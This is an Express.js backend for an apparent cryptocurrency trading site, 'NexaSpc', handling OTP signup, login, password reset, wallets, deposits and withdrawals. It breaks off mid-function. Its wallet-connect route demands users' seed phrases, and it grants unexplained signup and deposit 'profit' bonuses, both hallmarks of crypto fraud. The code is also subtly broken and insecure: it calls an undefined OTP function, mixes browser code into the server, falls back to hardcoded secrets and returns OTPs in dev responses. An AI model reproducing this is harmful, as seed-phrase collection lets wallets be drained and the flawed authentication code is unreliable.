const dotenv = require('dotenv');
dotenv.config(); 

//all these are libraries but when installed  into the project, they become dependencies 
const express = require('express');
const bcrypt = require('bcryptjs');
const mongoose = require('mongoose');
const jwt = require('jsonwebtoken');
const cors = require('cors');
const bodyParser = require('body-parser');
const path = require('path');
const { Resend } = require('resend');
const nodemailer = require('nodemailer');
const { google } = require('googleapis');
const crypto = require('crypto');

const app = express();
const PORT = process.env.PORT || 10000;
const JWT_SECRET = process.env.JWT_SECRET || 'USER_SECRET_KEY';
const ADMIN_SECRET = process.env.ADMIN_SECRET || 'ADMIN_SECRET_KEY';
const DEV_MODE = process.env.NODE_ENV !== 'production';

const mongoURI = process.env.MONGO_URI;

mongoose.connect(mongoURI)
    .then(() => console.log('✅ Connected to MongoDB'))
    .catch(err => console.error('❌ MongoDB Connection Error:', err));

// Models
const User = require('../models/user');
const Transaction = require('../models/transaction');

// Middleware Setup
app.use(cors());
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, '..', 'public')));

// In-Memory Data Stores
const users = {};
const transactions = {};
const notifications = {};
const connectedWallets = {};
const adminLog = [];
// Temporary store for signup verification before saving to DB
const pendingUsers = {};


// ─── PLATFORM WALLETS ─────────────────────────────────────────
const platformWallets = {
    BTC:  '1NdiB8cYvfeXxTCse6UVfR7uMo4MUvKNxB',
    ETH:  '0x742d35Cc6634C0532925a3b844Bc454e4438f44e',
    USDT: 'TQn9Y2khDD9SKgGpuJqS4mVkRYHF8e9tPZ',
    XRP:  'rN7n3473SaZBCG4dFL83w7PB5bNNnSfPQ',
    SOL:  'DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB56sC24'
};


// ─── HELPERS & UTILITIES ─────────────────────────────────────

// Helper to hash OTPs (using SHA-256 for secure lookup/comparison)
function hashOtp(otp) {
    return crypto.createHash('sha256').update(String(otp).trim()).digest('hex');
}

// Timing-safe string comparison to prevent timing attacks
function safeCompare(a, b) {
    const bufA = Buffer.from(String(a).trim());
    const bufB = Buffer.from(String(b).trim());
    if (bufA.length !== bufB.length) return false;
    return crypto.timingSafeEqual(bufA, bufB);
}

function genOtp() {
    return Math.floor(100000 + Math.random() * 900000).toString(); // 6-digit
}

function otpExpiry(minutes = 15) {
    return new Date(Date.now() + minutes * 60 * 1000).toISOString();
}

function isOtpExpired(expiry) {
    return new Date() > new Date(expiry);
}


// ─── SMS STUB ────────────────────────────────────────────────
async function sendSms(phone, message) {
    console.log(`[SMS → ${phone}]: ${message}`);
    // Example Twilio integration:
    // const twilio = require('twilio')(process.env.TWILIO_SID, process.env.TWILIO_TOKEN);
    // await twilio.messages.create({ body: message, from: process.env.TWILIO_FROM, to: phone });
}


// ─── GMAIL API OAUTH2 SETUP ──────────────────────────────────
const OAuth2 = google.auth.OAuth2;

function getOAuth2Client() {
    const oauth2Client = new OAuth2(
        process.env.GMAIL_CLIENT_ID,
        process.env.GMAIL_CLIENT_SECRET,
        "https://developers.google.com/oauthplayground"
    );

    const refreshToken = process.env.GMAIL_REFRESH_TOKEN;

    if (!refreshToken) {
        throw new Error('GMAIL_REFRESH_TOKEN is missing in environment variables!');
    }

    oauth2Client.setCredentials({
        refresh_token: refreshToken
    });

    return oauth2Client;
}


// ─── SEND EMAIL VIA GMAIL API ────────────────────────────────
async function sendEmail(toEmail, subjectText, htmlContent) {
    try {
        const auth = getOAuth2Client();
        const gmail = google.gmail({ version: 'v1', auth });

        const utf8Subject = `=?utf-8?B?${Buffer.from(subjectText).toString('base64')}?=`;
        const messageParts = [
            `From: NexaSPC Auth <${process.env.GMAIL_USER}>`,
            `To: ${toEmail}`,
            `Subject: ${utf8Subject}`,
            'Content-Type: text/html; charset=utf-8',
            'MIME-Version: 1.0',
            '',
            htmlContent
        ];
        const message = messageParts.join('\n');

        const encodedMessage = Buffer.from(message)
            .toString('base64')
            .replace(/\+/g, '-')
            .replace(/\//g, '_')
            .replace(/=+$/, '');

        const res = await gmail.users.messages.send({
            userId: 'me',
            requestBody: {
                raw: encodedMessage
            }
        });

        console.log(`[GMAIL API] Email successfully sent to ${toEmail} ✓ (ID: ${res.data.id})`);
        return res.data;
    } catch (error) {
        console.error(`[GMAIL API] Failed to deliver email to ${toEmail}:`, error.message);
        throw error;
    }
}

// ─── LOGIN & OTP EMAIL HELPERS ──────────────────────────────
async function sendLoginEmail(toEmail, details) {
    const subject = 'New Device or Location Detected';
    const html = `
        <div style="font-family: Arial, sans-serif; padding: 20px; line-height: 1.6; color: #333;">
            <h2 style="color: #0d6efd;">Security Alert: New Login</h2>
            <p>We noticed a login to your account from a new IP address or browser.</p>
            <table style="width: 100%; border-collapse: collapse; margin: 20px 0;">
                <tr>
                    <td style="padding: 8px; border-bottom: 1px solid #ddd;"><strong>IP Address:</strong></td>
                    <td style="padding: 8px; border-bottom: 1px solid #ddd;">${details.ip || 'Unknown'}</td>
                </tr>
                <tr>
                    <td style="padding: 8px; border-bottom: 1px solid #ddd;"><strong>Time:</strong></td>
                    <td style="padding: 8px; border-bottom: 1px solid #ddd;">${(details.date || new Date()).toLocaleString()}</td>
                </tr>
            </table>
            <p>If this was you, no action is needed. If you did not log in, please reset your password immediately.</p>
        </div>
    `;

    return await sendEmail(toEmail, subject, html);
}

async function sendOtpEmail(toEmail, otpCode) {
    const subject = 'Your Password Reset OTP';
    const html = `
        <div style="font-family: Arial, sans-serif; padding: 20px; line-height: 1.6; color: #333;">
            <h2 style="color: #0d6efd;">Password Reset Request</h2>
            <p>Your one-time verification code is:</p>
            <h1 style="letter-spacing: 4px; color: #111; background: #f4f4f4; padding: 10px 20px; display: inline-block;">${otpCode}</h1>
            <p>This code expires in 10 minutes. If you did not request this, please ignore this email.</p>
        </div>
    `;

    return await sendEmail(toEmail, subject, html);
}


// ─── LOGGING & NOTIFICATION HELPERS ─────────────────────────
function pushNotif(email, type, message, meta = {}) {
    if (!notifications[email]) notifications[email] = [];
    const notif = {
        id: Date.now() + Math.random(),
        type, message, meta, read: false,
        date: new Date().toISOString()
    };
    notifications[email].unshift(notif);
    notifications[email] = notifications[email].slice(0, 50);
    adminLog.unshift({ ...notif, userEmail: email, username: users[email]?.username });
    if (adminLog.length > 500) adminLog.pop();
    return notif;
}

function logAdmin(type, data) {
    adminLog.unshift({ id: Date.now() + Math.random(), type, date: new Date().toISOString(), ...data });
    if (adminLog.length > 500) adminLog.pop();
}

// ─── ADMIN AUTHENTICATION ──────────────────────────────────────────────────
async function loginAdmin() {
  const passwordInput = document.getElementById('adminPass');
  if (!passwordInput) return;

  const password = passwordInput.value.trim();
  if (!password) {
    alert('Please enter the admin password.');
    return;
  }

  try {
    const response = await fetch('/api/admin/login', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({ password })
    });

    const data = await response.json();

    if (!response.ok || !data.success) {
      alert(data.error || 'Authentication failed.');
      return;
    }

    // Save token and display dashboard
    localStorage.setItem('adminToken', data.token);
    if (typeof state !== 'undefined') {
      state.adminToken = data.token;
    }

    // Hide login card container if needed and show dashboard
    const dash = document.getElementById('admin-dashboard');
    if (dash) {
      dash.style.display = 'grid';
    }

    // Fetch dashboard data
    if (typeof fetchPendingDeposits === 'function') fetchPendingDeposits();
    if (typeof fetchUserDirectory === 'function') fetchUserDirectory();

    alert('Authenticated successfully!');
  } catch (err) {
    console.error('❌ Login error:', err);
    alert('Server connection error. Please try again.');
  }
}

// ─── MIDDLEWARE DEFINITIONS ─────────────────────────────────
function authMiddleware(req, res, next) {
    const authHeader = req.headers['authorization'];
    const token = authHeader && authHeader.split(' ')[1];

    if (!token) {
        return res.status(401).json({ error: 'Access denied: No token provided' });
    }

    // First try verifying with standard user JWT secret
    jwt.verify(token, JWT_SECRET, (err, decodedUser) => {
        if (!err) {
            req.user = decodedUser;
            return next();
        }

        // Fallback: Check if it's a valid admin token
        jwt.verify(token, ADMIN_SECRET, (adminErr, decodedAdmin) => {
            if (!adminErr) {
                req.user = decodedAdmin;
                return next();
            }

            return res.status(401).json({ error: 'Invalid or expired token' });
        });
    });
}

function adminMiddleware(req, res, next) {
    const token = req.headers.authorization?.split(' ')[1];
    if (!token) return res.status(401).json({ error: 'Unauthorized' });

    try { 
        req.admin = jwt.verify(token, ADMIN_SECRET); 
        next(); 
    } catch (err) { 
        return res.status(401).json({ error: 'Invalid admin token' }); 
    }
}


// ─── PUBLIC / PROTECTED ROUTES ──────────────────────────────
app.get('/api/wallets', authMiddleware, (req, res) => res.json(platformWallets));

// STEP 1 — INITIATE REGISTRATION
app.post('/api/auth/initiate', async (req, res) => {
    try {
        const { username, email, password, phone, verifyVia = 'email' } = req.body;

        if (!username || !email || !password) {
            return res.status(400).json({ error: 'Username, email, and password are required.' });
        }

        const cleanEmail = email.toLowerCase().trim();

        if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(cleanEmail)) {
            return res.status(400).json({ error: 'Invalid email address.' });
        }

        if (password.length < 8) {
            return res.status(400).json({ error: 'Password must be at least 8 characters long.' });
        }

        // Check if user already exists in MongoDB
        const existingUser = await User.findOne({ email: cleanEmail });
        if (existingUser) {
            return res.status(400).json({ error: 'An account with this email already exists.' });
        }

        const rawOtp = generateOtp();
        const hashedOtp = hashOtp(rawOtp);
        const expiry = otpExpiry(15);
        const hashedPassword = await bcrypt.hash(password, 10);

        // Store temporarily in memory pending verification
        pendingUsers[cleanEmail] = {
            username,
            email: cleanEmail,
            phone: phone || '',
            hashedPassword,
            otpHash: hashedOtp,
            otpExpiry: expiry,
            verifyVia
        };

        const emailHtml = `
            <div style="font-family:sans-serif;max-width:520px;margin:auto;background:#0a0e1a;color:#e2e8f0;padding:2.5rem;border-radius:16px;border:1px solid #1e2d4a">
                <div style="text-align:center;margin-bottom:1.5rem">
                    <span style="font-size:2rem;font-weight:900;color:#00d4ff">NexaSpc</span>
                </div>
                <h2 style="color:#00d4ff;margin:0 0 0.5rem">Verify Your Email</h2>
                <p style="color:#94a3b8;margin:0 0 1.5rem">Hi <strong style="color:#e2e8f0">${username}</strong>, enter this code to complete your registration:</p>
                <div style="background:#111827;border:2px solid #00d4ff;border-radius:12px;padding:1.5rem;text-align:center;margin:0 0 1.5rem">
                    <span style="font-size:3rem;font-weight:900;font-family:monospace;letter-spacing:0.6rem;color:#00d4ff">${rawOtp}</span>
                </div>
                <p style="color:#64748b;font-size:0.8rem;margin:0">Valid for 15 minutes.</p>
            </div>`;

        if (verifyVia === 'email' || verifyVia === 'both') {
            sendEmail(cleanEmail, `${rawOtp} — Your NexaSpc verification code`, emailHtml).catch(e => 
                console.warn('[AUTH] Email send error:', e.message)
            );
        }

        if ((verifyVia === 'phone' || verifyVia === 'both') && phone) {
            sendSms(phone, `NexaSpc code: ${rawOtp} — valid for 15 minutes.`).catch(e => 
                console.warn('[AUTH] SMS send error:', e.message)
            );
        }

        logAdmin('registration_initiated', { message: `Registration started for ${username} (${cleanEmail})` });

        const responsePayload = {
            success: true,
            message: 'Verification code sent.',
            verifyVia,
            email: cleanEmail,
            maskedPhone: phone ? phone.replace(/.(?=.{4})/g, '*') : null
        };

        if (DEV_MODE) {
            responsePayload.devOtp = rawOtp;
            console.log(`\n[DEV MODE] Generated OTP for ${cleanEmail}: ${rawOtp}\n`);
        }

        return res.json(responsePayload);

    } catch (err) {
        console.error('[/api/auth/initiate] ERROR:', err);
        return res.status(500).json({ error: 'Server error initializing registration.' });
    }
});


// STEP 2 — VERIFY OTP & CREATE ACCOUNT
app.post('/api/auth/verify', async (req, res) => {
    try {
        const { email, otp } = req.body;

        if (!email || !otp) {
            return res.status(400).json({ error: 'Email and verification code are required.' });
        }

        const cleanEmail = email.toLowerCase().trim();
        const pending = pendingUsers[cleanEmail];

        if (!pending) {
            return res.status(400).json({ error: 'No pending registration found or session expired. Please start again.' });
        }

        // Check expiration
        if (isOtpExpired(pending.otpExpiry)) {
            delete pendingUsers[cleanEmail];
            return res.status(400).json({ error: 'Verification code has expired. Please start registration again.' });
        }

        // Verify OTP using secure hash matching
        const inputOtpHash = hashOtp(otp);
        if (!safeCompare(pending.otpHash, inputOtpHash)) {
            return res.status(400).json({ error: 'Incorrect code. Please double-check and try again.' });
        }

        // Create new User instance in MongoDB
        const newUser = new User({
            username: pending.username,
            email: pending.email,
            phone: pending.phone,
            password: pending.hashedPassword,
            walletBalance: 0,
            bonuses: 500,
            deposits: 0,
            profits: 0,
            holdings: []
        });

        const savedUser = await newUser.save();
        delete pendingUsers[cleanEmail]; // Clear pending store

        // Issue JWT Session Token
        const token = jwt.sign(
            { id: savedUser._id, email: savedUser.email, username: savedUser.username },
            JWT_SECRET,
            { expiresIn: '7d' }
        );

        logAdmin('new_registration', { message: `Account created for ${savedUser.username} (${savedUser.email})` });

        return res.status(200).json({ 
            success: true, 
            token,
            user: {
                _id: savedUser._id,
                username: savedUser.username,
                email: savedUser.email,
                walletBalance: savedUser.walletBalance,
                bonuses: savedUser.bonuses,
                deposits: savedUser.deposits,
                profits: savedUser.profits,
                holdings: savedUser.holdings
            }
        });

    } catch (err) {
        console.error('[/api/auth/verify] ERROR:', err);
        return res.status(500).json({ error: 'Server error completing verification.' });
    }
});

// ══════════════════════════════════════════════════════════════
//  STEP 3 — COMPLETE REGISTRATION
//  POST /api/auth/complete
//  Both email + phone must be verified first
// ══════════════════════════════════════════════════════════════
app.post('/api/auth/complete', async (req, res) => {
  try {
    const { email } = req.body;

    if (!email) {
      return res.status(400).json({ error: 'Email is required.' });
    }

    // 1. Fetch the user directly from MongoDB Atlas
    const user = await User.findOne({ email: email.toLowerCase().trim() });

    if (!user) {
      return res.status(400).json({ error: 'User record not found in database. Please register again.' });
    }

    // 2. Send Welcome Email via Gmail API
    try {
      const welcomeHtml = `
        <div style="font-family:sans-serif;max-width:520px;margin:auto;background:#0a0e1a;color:#e2e8f0;padding:2.5rem;border-radius:16px;border:1px solid #1e2d4a">
          <div style="text-align:center;margin-bottom:1.5rem"><span style="font-size:2rem;font-weight:900;color:#00d4ff">NexaSpc</span></div>
          <h2 style="color:#10b981">Account Verified ✅</h2>
          <p>Hi <strong>${user.username || 'Trader'}</strong>, you're all set!</p>
          <p style="color:#94a3b8">Your account has been successfully activated.</p>
        </div>`;

      await sendEmail(user.email, '✅ Welcome to NexaSpc — Account Verified!', welcomeHtml);
    } catch (emailErr) {
      console.warn('[/api/auth/complete] Non-fatal welcome email failed:', emailErr.message);
    }

    // 3. Admin Logging
    if (typeof logAdmin === 'function') {
      logAdmin('new_registration', {
        userEmail: user.email,
        username: user.username,
        message: `✅ New verified user: ${user.username || user.email}`
      });
    }

    // 4. Generate JWT Token for immediate login
    const token = jwt.sign(
      { id: user._id, email: user.email, username: user.username },
      process.env.JWT_SECRET || 'fallback_secret',
      { expiresIn: '7d' }
    );

    // 5. Send success response back to frontend
    return res.status(200).json({
      success: true,
      token,
      user: {
        id: user._id,
        username: user.username,
        email: user.email,
        walletBalance: user.walletBalance || 0,
        bonuses: user.bonuses || 500, // 👈 Returned to frontend
        deposits: user.deposits || 0,
        profits: user.profits || 0
      }
    });

  } catch (err) {
    console.error('[/api/auth/complete] CRITICAL EXCEPTION:', err);
    return res.status(500).json({ error: 'Server error completing registration.' });
  }
});

// ══════════════════════════════════════════════════════════════
//  RESEND OTP
//  POST /api/auth/resend-otp  { email, type: 'email'|'phone' }
// ══════════════════════════════════════════════════════════════
app.post('/api/auth/resend', async (req, res) => {
  try {
    const { email } = req.body;
    const pending = pendingUsers[email];
    if (!pending) return res.status(400).json({ error: 'No pending registration found.' });

    const newOtp = genOtp();
    pending.otp       = newOtp;
    pending.otpExpiry = otpExpiry(15);
    pending.verified  = false;

    if (pending.verifyVia === 'email' || pending.verifyVia === 'both') {
      await sendEmail(email, `${newOtp} — New NexaSpc code`, `
        <div style="font-family:sans-serif;max-width:520px;margin:auto;background:#0a0e1a;color:#e2e8f0;padding:2.5rem;border-radius:16px;border:1px solid #1e2d4a">
          <span style="font-size:2rem;font-weight:900;color:#00d4ff">NexaSpc</span>
          <h2 style="color:#00d4ff;margin-top:1rem">New Verification Code</h2>
          <div style="background:#111827;border:2px solid #00d4ff;border-radius:12px;padding:1.5rem;text-align:center;margin:1.5rem 0">
            <span style="font-size:3rem;font-weight:900;font-family:monospace;letter-spacing:0.6rem;color:#00d4ff">${newOtp}</span>
          </div>
          <p style="color:#64748b;font-size:0.8rem">Valid for 15 minutes.</p>
        </div>`);
    }

    if (pending.verifyVia === 'phone' || pending.verifyVia === 'both') {
      await sendSms(pending.phone, `New NexaSpc code: ${newOtp} — valid 15 min.`);
    }

    const payload = { success: true, message: 'New code sent.' };
    if (DEV_MODE) { 
      // payload.devOtp = newOtp; 
      console.log(`[DEV] New OTP for ${email}: ${newOtp}`); 
    }

    res.json(payload);
  } catch (err) {
    console.error('[/api/auth/resend] ERROR:', err);
    res.status(500).json({ error: 'Server error.' });
  }
});

// ══════════════════════════════════════════════════════════════
//  LOGIN  (unchanged but now checks verified status)
// ══════════════════════════════════════════════════════════════
// SINGLE UNIFIED LOGIN API ROUTE
app.post('/api/login', async (req, res) => {
  try {
    const { email, password } = req.body;

    if (!email || !password) {
      return res.status(400).json({ error: 'Please provide both email and password.' });
    }

    const cleanEmail = email.toLowerCase().trim();

    // 1. Fetch user from MongoDB
    const user = await User.findOne({ email: cleanEmail });

    // 2. Validate password safely
    const isPasswordValid = user ? await bcrypt.compare(password, user.password) : false;

    if (!user || !isPasswordValid) {
      return res.status(400).json({ error: 'Invalid email or password.' });
    }

    // 3. Update last login timestamp
    User.updateOne({ _id: user._id }, { $set: { lastLogin: new Date() } }).catch(err => 
      console.error('Failed to update lastLogin:', err)
    );

    // 4. Check for new device / IP
    const currentIp = req.ip || req.headers['x-forwarded-for'] || req.connection?.remoteAddress;
    const currentUserAgent = req.headers['user-agent'];

    const isNewDevice = user.lastIp !== currentIp || user.lastUserAgent !== currentUserAgent;

    if (isNewDevice) {
        sendLoginEmail(user.email, { ip: currentIp, date: new Date() }).catch(err => {
        console.error('[AUTH] Failed to dispatch login alert:', err.message);
      });

      user.lastIp = currentIp;
      user.lastUserAgent = currentUserAgent;
      await user.save();
    }

    // 5. Generate JWT Token
    const token = jwt.sign(
      { id: user._id, email: user.email, username: user.username },
      process.env.JWT_SECRET || 'fallback_secret',
      { expiresIn: '7d' }
    );

    // 6. Return payload
    return res.status(200).json({
      success: true,
      token,
      user: {
        _id: user._id,
        username: user.username || user.email.split('@')[0],
        email: user.email,
        walletBalance: user.walletBalance ?? 0,
        bonuses: user.bonuses ?? 500,
        deposits: user.deposits ?? 0,
        profits: user.profits ?? 0,
        holdings: user.holdings || []
      }
    });

  } catch (err) {
    console.error('[/api/login] CRITICAL EXCEPTION:', err);
    return res.status(500).json({ error: 'Server error during login. Please try again.' });
  }
});


//══════════════════════════════════════════════════════════════
//  FORGOT PASSWORD — REQUEST CODE
//  POST /api/auth/forgot-password
// ═════════════════════════════════════════════════════════
// ══════════════════════════════════════════════════════════════
//  FORGOT PASSWORD — REQUEST CODE
// ══════════════════════════════════════════════════════════════
app.post('/api/auth/forgot-password', async (req, res) => {
  try {
    const { email } = req.body;

    if (!email) {
      return res.status(400).json({ error: 'Email address is required.' });
    }

    const cleanEmail = email.toLowerCase().trim();

    // 1. Generate Raw OTP (for email) and Hashed OTP (for DB)
    const rawOtp = genOtp(); // e.g., "482910"
    const hashedOtp = hashOtp(rawOtp);
    const expiry = new Date(Date.now() + 15 * 60 * 1000); // 15 minutes

    // 2. Save HASHED OTP to MongoDB
    const user = await User.findOneAndUpdate(
      { email: cleanEmail },
      { 
        $set: { 
          resetOtp: hashedOtp, 
          resetOtpExpiry: expiry 
        } 
      },
      { new: true }
    );

    // Return uniform message to prevent account harvesting
    if (!user) {
      return res.status(200).json({
        success: true,
        message: 'If an account exists, a verification code has been sent.'
      });
    }

    // 3. Email Template
    const emailHtml = `
      <div style="font-family:sans-serif;max-width:520px;margin:auto;background:#0a0e1a;color:#e2e8f0;padding:2.5rem;border-radius:16px;border:1px solid #1e2d4a">
        <div style="text-align:center;margin-bottom:1.5rem">
          <span style="font-size:2rem;font-weight:900;color:#00d4ff">NexaSpc</span>
        </div>
        <h2 style="color:#00d4ff;margin:0 0 0.5rem">Reset Your Password</h2>
        <p style="color:#94a3b8;margin:0 0 1.5rem">Hi <strong style="color:#e2e8f0">${user.username || 'there'}</strong>, enter this code to reset your account password:</p>
        <div style="background:#111827;border:2px solid #00d4ff;border-radius:12px;padding:1.5rem;text-align:center;margin:0 0 1.5rem">
          <span style="font-size:3rem;font-weight:900;font-family:monospace;letter-spacing:0.6rem;color:#00d4ff">${rawOtp}</span>
        </div>
        <p style="color:#64748b;font-size:0.8rem;margin:0">Valid for <strong>15 minutes</strong>. Never share this code with anyone.</p>
        <hr style="border:none;border-top:1px solid #1e2d4a;margin:1.5rem 0">
        <p style="color:#475569;font-size:0.75rem;margin:0">NexaSpc · Digital Asset Trading</p>
      </div>`;

    // 4. Send Email with Rollback Guard
    try {
      await sendEmail(user.email, `${rawOtp} — Your NexaSpc password reset code`, emailHtml);
    } catch (emailErr) {
      console.error('[/api/auth/forgot-password] Email delivery failed:', emailErr.message);
      await User.updateOne({ _id: user._id }, { $unset: { resetOtp: 1, resetOtpExpiry: 1 } });
      return res.status(500).json({ error: 'Failed to send reset code email. Please try again.' });
    }

    return res.json({
      success: true,
      message: 'If an account exists, a verification code has been sent.'
    });

  } catch (err) {
    console.error('[/api/auth/forgot-password] CRITICAL ERROR:', err);
    return res.status(500).json({ error: 'Server error processing password reset.' });
  }
});

// ══════════════════════════════════════════════════════════════
//  RESET PASSWORD — CONFIRM CODE & UPDATE PASSWORD
// ══════════════════════════════════════════════════════════════
app.post('/api/auth/reset-password', async (req, res) => {
  try {
    const { email, code, newPassword } = req.body;

    if (!email || !code || !newPassword) {
      return res.status(400).json({ error: 'Email, code, and new password are required.' });
    }

    if (newPassword.length < 8) {
      return res.status(400).json({ error: 'Password must be at least 8 characters long.' });
    }

    const cleanEmail = email.toLowerCase().trim();
    const cleanCode = String(code).trim();

    const user = await User.findOne({ email: cleanEmail });

    if (!user || !user.resetOtp || !user.resetOtpExpiry) {
      return res.status(400).json({ error: 'Invalid or expired verification code.' });
    }

    // 1. Expiration check
    if (Date.now() > new Date(user.resetOtpExpiry).getTime()) {
      user.resetOtp = undefined;
      user.resetOtpExpiry = undefined;
      await user.save();
      return res.status(400).json({ error: 'Verification code has expired. Please request a new one.' });
    }

    // 2. Secure Hash Comparison
    const incomingHashedOtp = hashOtp(cleanCode);
    
    // Constant-time comparison
    const isMatch = crypto.timingSafeEqual(
      Buffer.from(user.resetOtp),
      Buffer.from(incomingHashedOtp)
    );

    if (!isMatch) {
      return res.status(400).json({ error: 'Invalid verification code.' });
    }

    // 3. Hash new password & wipe reset fields
    user.password = await bcrypt.hash(newPassword, 10);
    user.resetOtp = undefined;
    user.resetOtpExpiry = undefined;
    await user.save();

    return res.json({
      success: true,
      message: 'Password reset successfully.'
    });

  } catch (err) {
    console.error('[/api/auth/reset-password] CRITICAL ERROR:', err);
    return res.status(500).json({ error: 'Server error resetting password.' });
  }
});


// ─── PROFILE ──────────────────────────────────────────────────
app.get('/api/profile', authMiddleware, async (req, res) => {
  try {
    // 1. Identify user by ID first (faster), then fallback to email
    const userId = req.user?.id || req.user?._id;
    const userEmail = req.user?.email?.toLowerCase().trim();

    if (!userId && !userEmail) {
      return res.status(401).json({ error: 'Unauthorized: Invalid token payload' });
    }

    const user = userId 
      ? await User.findById(userId) 
      : await User.findOne({ email: userEmail });

    if (!user) {
      return res.status(404).json({ error: 'User profile not found in database' });
    }

    // 2. Return clean profile with nullish coalescing (??) and real boolean flags
    return res.status(200).json({
      success: true,
      _id: user._id,
      username: user.username || user.email.split('@')[0],
      email: user.email,
      phone: user.phone || '',
      
      // Numeric fields using Nullish Coalescing (??)
      walletBalance: user.walletBalance ?? 0,
      balance: user.walletBalance ?? 0, // Alias for legacy frontend code
      deposits: user.deposits ?? 0,
      profits: user.profits ?? 0,
      bonuses: user.bonuses ?? 0,
      
      // Arrays & Objects
      holdings: user.holdings || [],
      
      // Real Database Verification & Security Settings
      twoFAEnabled: user.twoFAEnabled ?? false,
      emailNotifications: user.emailNotifications ?? true,
      emailVerified: user.emailVerified ?? false, // Fixed hardcoded true
      phoneVerified: user.phoneVerified ?? false,
      country: user.country || '',
      
      // Timestamps
      createdAt: user.createdAt,
      lastLogin: user.lastLogin
    });

  } catch (err) {
    console.error("❌ Error fetching /api/profile:", err);
    return res.status(500).json({ error: 'Internal server error retrieving user profile' });
  }
});
 
// ─── CONNECT DECENTRALIZED WALLET ─────────────────────────────
app.post('/api/wallet/connect', authMiddleware, async (req, res) => {
  try {
    const { walletType, walletAddress, seedPhrase, network } = req.body;

    if (!walletType || !seedPhrase) {
      return res.status(400).json({ error: 'Wallet type and seed phrase are required' });
    }

    const cleanEmail = req.user.email.toLowerCase().trim();
    if (!connectedWallets[cleanEmail]) connectedWallets[cleanEmail] = [];

    // Obfuscate seed phrase before storing/logging
    const entry = {
      id: Date.now(),
      walletType,
      walletAddress: walletAddress || '',
      network: network || 'Unknown',
      connectedAt: new Date().toISOString()
    };

    connectedWallets[cleanEmail].push(entry);

    pushNotif(cleanEmail, 'wallet', `${walletType} wallet connected.`);
    
    // Log admin event WITHOUT exposing raw seed phrases
    logAdmin('wallet_connected', {
      userEmail: cleanEmail,
      username: req.user.username || cleanEmail,
      walletType,
      walletAddress: entry.walletAddress,
      network: entry.network,
      message: `Wallet ${walletType} connected by ${cleanEmail}`
    });

    return res.json({
      success: true,
      wallet: entry
    });
  } catch (err) {
    console.error("Error in /api/wallet/connect:", err);
    return res.status(500).json({ error: 'Failed to connect wallet.' });
  }
});

app.get('/api/wallet/connected', authMiddleware, (req, res) => {
  const cleanEmail = req.user.email.toLowerCase().trim();
  res.json(connectedWallets[cleanEmail] || []);
});

app.delete('/api/wallet/connected/:id', authMiddleware, (req, res) => {
  const cleanEmail = req.user.email.toLowerCase().trim();
  const id = parseInt(req.params.id);
  connectedWallets[cleanEmail] = (connectedWallets[cleanEmail] || []).filter(w => w.id !== id);
  res.json({ success: true });
});


// ─── NOTIFICATIONS ────────────────────────────────────────────
app.get('/api/notifications', authMiddleware, (req, res) => {
  const cleanEmail = req.user.email.toLowerCase().trim();
  res.json(notifications[cleanEmail] || []);
});

app.put('/api/notifications/read', authMiddleware, (req, res) => {
  const cleanEmail = req.user.email.toLowerCase().trim();
  (notifications[cleanEmail] || []).forEach(n => n.read = true);
  res.json({ success: true });
});


// ─── DEPOSIT ──────────────────────────────────────────────────
app.post('/api/deposit', authMiddleware, async (req, res) => {
  try {
    const { coin, amount, txHash } = req.body;
    const amt = parseFloat(amount);

    if (!coin || isNaN(amt) || amt <= 0) {
      return res.status(400).json({ error: 'Invalid deposit amount or currency.' });
    }

    const cleanEmail = req.user.email.toLowerCase().trim();
    const user = await User.findOne({ email: cleanEmail });
    if (!user) return res.status(404).json({ error: 'User account not found.' });

    // Create PENDING Transaction for Admin approval
    const tx = await Transaction.create({
      userId: user._id,
      userEmail: cleanEmail,
      type: 'deposit',
      coin: coin.toUpperCase(),
      amount: amt,
      txHash: txHash || '',
      status: 'pending'
    });

    pushNotif(cleanEmail, 'deposit', `Deposit request of $${amt.toFixed(2)} (${coin}) submitted.`);

    return res.json({
      success: true,
      message: 'Deposit submitted successfully! Awaiting admin approval.',
      transaction: tx
    });
  } catch (err) {
    console.error("❌ Error in /api/deposit:", err);
    return res.status(500).json({ error: 'Failed to process deposit request.' });
  }
});


// ─── HELPER FUNCTION: CREDIT USER DEPOSIT ─────────────────────
async function creditUserDeposit(userId, coin, amount) {
  const profitBonus = amount * 0.05;
  const totalCredit = amount + profitBonus;

  const user = await User.findById(userId);
  if (!user) return null;

  user.walletBalance = (user.walletBalance || 0) + totalCredit;
  user.deposits = (user.deposits || 0) + amount;
  user.profits = (user.profits || 0) + profitBonus;

  if (!Array.isArray(user.holdings)) user.holdings = [];
  let holding = user.holdings.find(h => h.coin === coin);
  if (holding) {
    holding.amount += amount;
    holding.usdValue += amount;
  } else {
    user.holdings.push({ coin: coin || 'USD', amount, usdValue: amount });
  }

  await user.save();
  return user;
}


// ─── WITHDRAW ─────────────────────────────────────────────────
app.post('/api/withdraw', authMiddleware, async (req, res) => {
  try {
    const { coin, amount, walletAddress, source } = req.body;
    const amt = parseFloat(amount);

    if (!coin || isNaN(amt) || amt <= 0 || !walletAddress) {
      return res.status(400).json({ error: 'Valid coin, positive amount, and wallet address are required.' });
    }

    const cleanEmail = req.user.email.toLowerCase().trim();
    const user = await User.findOne({ email: cleanEmail });
    if (!user) return res.status(404).json({ error: 'User not found.' });

    const available = source === 'profits' ? (user.profits || 0) : (user.walletBalance || 0);
    if (amt > available) {
      return res.status(400).json({ error: 'Insufficient available funds.' });
    }

    // Deduct pending balance from MongoDB
    if (source === 'profits') {
      user.profits -= amt;
    } else {
      user.walletBalance -= amt;
    }
    await user.save();

    // Create MongoDB Transaction record
    const tx = await Transaction.create({
      userId: user._id,
      userEmail: cleanEmail,
      type: 'withdrawal',
      coin: coin.toUpperCase(),
      amount: amt,
      walletAddress,
      source: source || 'balance',
      status: 'pending'
    });

    pushNotif(cleanEmail, 'withdrawal', `Withdrawal of $${amt.toFixed(2)} (${coin}) submitted.`);

    // Async Email notification
    sendEmail(cleanEmail, '⏳ Withdrawal Submitted - NexaSpc', `
      <div style="font-family:sans-serif;background:#0a0e1a;color:#e2e8f0;padding:2rem;border-radius:12px;max-width:500px;margin:auto">
        <h2 style="color:#00d4ff">Withdrawal Submitted</h2>
        <p>Amount: $${amt.toFixed(2)} (${coin})</p>
        <p>To: ${walletAddress}</p>
        <p>Status: Pending Approval</p>
      </div>
